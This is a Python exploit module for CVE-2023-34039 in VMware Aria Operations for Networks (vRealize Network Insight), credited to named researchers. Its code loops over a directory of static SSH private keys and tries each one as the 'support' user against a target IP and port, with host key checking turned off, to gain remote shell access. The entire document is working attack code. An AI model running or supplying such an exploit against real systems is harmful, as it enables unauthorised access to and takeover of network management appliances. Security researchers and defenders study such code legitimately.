"""
VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE (CVE-2023-34039)
Version: All versions from 6.0 to 6.10
Discovered by: Harsh Jaiswal (@rootxharsh) and Rahul Maini (@iamnoooob) at ProjectDiscovery Research
Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
A root cause analysis of the vulnerability can be found on my blog:
https://summoning.team/blog/vmware-vrealize-network-insight-ssh-key-rce-cve-2023-34039/
"""

import os
class Cve_2023_34039:
    def sanity_check(self):
        if os.name == 'posix':
            os.system('chmod -R 700 cve/VMware/keys/')

    def exploit(self,ip,port):
        for root, dirs, files in os.walk("cve/VMware/keys"):
            for file in files:
                key_file = str(os.path.join(root, file))
                print(f"(*) Trying key: {key_file}\n")
                ssh_command = ['ssh', '-i', key_file, 'support@' + ip, '-p', port, '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'BatchMode=yes', '2>/dev/null']
                try:
                    ssh_command = ' '.join(ssh_command)
                    coutput = os.system(ssh_command)
                except Exception as e:
                    log = f"(-) Failed connecting to {ip}:{port} with key {key_file}!"
                    continue
    def main(self,target):
        ip= target['ip']
        port = target['port']
        print("""(!) VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE (CVE-2023-34039)

        (*) Exploit by Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
        """)
        self.sanity_check()
        self.exploit(ip,port)